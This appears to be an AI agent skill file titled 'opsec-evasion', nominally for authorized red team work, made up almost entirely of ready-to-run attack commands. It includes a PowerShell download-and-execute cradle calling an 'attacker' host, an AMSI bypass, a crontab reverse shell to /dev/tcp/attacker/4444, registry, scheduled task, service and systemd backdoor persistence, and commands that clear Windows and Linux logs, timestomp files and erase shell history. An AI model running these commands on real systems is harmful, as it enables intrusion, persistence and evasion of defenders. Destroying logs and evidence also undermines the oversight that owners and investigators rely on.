---
name: opsec-evasion
description: Operational security techniques for avoiding detection during authorized red team engagements.
---

# OPSEC Evasion Skill

## When to Use
Use this skill for operational security during authorized red team engagements to avoid detection by defensive teams.

## Network Evasion

### Traffic Blending
```bash
# Use common protocols
curl -H "User-Agent: Mozilla/5.0" https://target.com

# Randomize timing
sleep $(( RANDOM % 60 + 30 ))

# Use legitimate domains
# Domain fronting via CDN
```

### DNS Evasion
```bash
# Use DNS over HTTPS
curl "https://dns.google/resolve?name=target.com&type=A"

# Subdomain encoding
# data.evil.target.com (encode data in subdomain)

# Fast flux DNS
# Rotate IPs frequently
```

## Endpoint Evasion

### Process Injection
```bash
# DLL injection
rundll32.exe payload.dll,ExportFunction

# Process hollowing
# Custom tools required

# reflective loading
# Memory-only execution
```

### Fileless Techniques
```bash
# PowerShell in-memory
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload')"

# WMI execution
wmic process call create "powershell -ep bypass -c <command>"

# Registry persistence
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v update /d "C:\temp\payload.exe"
```

### AMSI Bypass
```powershell
# Various techniques
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

## Log Evasion

### Clear Logs
```bash
# Windows
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Linux
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
history -c
```

### Timestomp
```bash
# Modify file timestamps
touch -r /bin/ls payload.exe
```

## Persistence

### Windows
```bash
# Registry
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v update /d "C:\temp\payload.exe"

# Scheduled Tasks
schtasks /create /sc hourly /mo 1 /tn Update /tr "C:\temp\payload.exe"

# Services
sc create Update binPath= "C:\temp\payload.exe" start= auto
```

### Linux
```bash
# Crontab
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'" | crontab -

# Systemd
cat > /etc/systemd/system/update.service << EOF
[Unit]
Description=System Update

[Service]
ExecStart=/tmp/.backdoor

[Install]
WantedBy=multi-user.target
EOF
systemctl enable update
```

## Evidence Cleanup
```bash
# Remove tools
rm -f /tmp/.backdoor
rm -rf /tmp/tools/

# Clear history
history -c
rm -f ~/.bash_history
rm -f ~/.zsh_history

# Secure delete
shred -vfz -n 5 sensitive_file.txt
```

## OPSEC Rules
1. Assume all traffic is monitored
2. Use encrypted channels
3. Minimize tool footprint
4. Clean up artifacts
5. Document all actions
